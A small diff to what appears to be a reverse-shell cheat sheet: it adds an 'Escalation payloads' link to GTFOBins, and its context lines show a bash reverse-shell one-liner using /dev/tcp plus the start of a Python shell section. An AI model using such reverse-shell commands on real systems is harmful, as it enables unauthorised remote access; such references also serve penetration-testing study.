@@ -74,6 +74,9 @@ Client
 bash -c "bash -i >& /dev/tcp/127.0.0.1/444 0>&1"
 ```
 
+### Escalation payloads
+[gtfobins](https://gtfobins.github.io/gtfobins/ssh/)
+
 ### Basic Python shell
 ```
 import os
